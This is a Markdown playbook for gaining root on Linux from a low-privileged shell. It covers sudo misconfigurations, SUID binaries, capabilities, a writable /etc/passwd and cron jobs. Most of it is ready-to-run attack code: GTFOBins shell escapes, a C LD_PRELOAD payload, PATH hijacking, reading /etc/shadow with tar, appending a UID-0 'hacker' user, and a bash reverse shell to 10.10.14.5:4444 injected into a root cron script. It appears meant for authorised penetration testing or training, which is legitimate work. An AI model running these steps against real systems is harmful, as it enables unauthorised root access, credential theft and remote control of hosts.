# 🐧 Linux Privilege Escalation Playbook

Systematic methodology and command references for elevating from a low-privileged shell to `root` on Linux targets.

---

### Initial Enumeration Checklist

```bash
# Identity and group memberships (check for lxd, docker, sudo, wheel, adm)
id
whoami

# Kernel version and architecture
uname -a
cat /etc/os-release

# Network connections and local listening sockets
ss -tulpn
netstat -tulpn

# Process listing running as root
ps aux | grep root
```

---

### Vector 1: Sudo Misconfigurations (`sudo -l`)

```bash
# Check sudo permissions for current user
sudo -l
```

#### Common GTFOBins Sudo Abuses:
* **`sudo find`**:
  ```bash
  sudo find . -exec /bin/sh \; -quit
  ```
* **`sudo vim` / `sudo vi`**:
  ```bash
  sudo vim -c ':!/bin/sh'
  ```
* **`sudo less` / `sudo more`**:
  ```bash
  # Inside pager, type:
  !/bin/sh
  ```
* **`sudo awk`**:
  ```bash
  sudo awk 'BEGIN {system("/bin/sh")}'
  ```

#### `LD_PRELOAD` Environment Preservation
If `sudo -l` displays `env_keep += LD_PRELOAD`:
```c
// Save as /tmp/pe.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
Compile and execute:
```bash
gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles
sudo LD_PRELOAD=/tmp/pe.so <any_allowed_sudo_command>
```

---

### Vector 2: SUID / SGID Binaries

Binaries with the SetUID bit (`4000`) execute with the permissions of the file owner (usually `root`).

```bash
# Find all SUID binaries on system
find / -perm -u=s -type f 2>/dev/null
```

#### Exploitation Examples:
* **Custom SUID with Relative Paths**:
  If a custom SUID binary calls `service` or `cat` without an absolute path, hijack `$PATH`:
  ```bash
  echo "/bin/bash -p" > /tmp/cat
  chmod +x /tmp/cat
  export PATH=/tmp:$PATH
  /path/to/suid_binary
  ```
* **Known GTFOBins SUID (e.g. `pkexec`, `env`, `cp`)**:
  ```bash
  /usr/bin/env /bin/sh -p
  ```

---

### Vector 3: Linux Capabilities

Linux Capabilities divide the traditional all-or-nothing privileges of `root` into distinct units. If a binary is granted `cap_setuid` or `cap_dac_override`, it can be leveraged for root execution.

```bash
# Enumerate all files with custom capabilities
getcap -r / 2>/dev/null
```

* **`python3` with `cap_setuid+ep`**:
  ```bash
  python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  ```
* **`tar` with `cap_dac_read_search+ep`**:
  ```bash
  # Read /etc/shadow or root SSH keys
  tar -cvf shadow.tar /etc/shadow
  tar -xvf shadow.tar
  ```

---

### Vector 4: Writable `/etc/passwd`

If `/etc/passwd` has world-writable permissions (`-rw-rw-rw-`):

```bash
# Generate password hash for 'password123'
openssl passwd -1 -salt evil password123
# Output: $1$evil$TjG...

# Append a new root-equivalent user (UID 0, GID 0)
echo 'hacker:$1$evil$TjG6pXjPqW4g128B4fP/..:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to the new root user
su hacker
```

---

### Vector 5: Cron Job Exploitation

```bash
# Inspect system-wide crontabs
cat /etc/crontab
ls -la /etc/cron.*

# Monitor real-time processes to catch recurring cron scripts
# Using pspy (unprivileged process snooping)
./pspy64
```

If a cron job running as `root` executes a script writable by your user:
```bash
echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" >> /opt/scripts/backup.sh
```
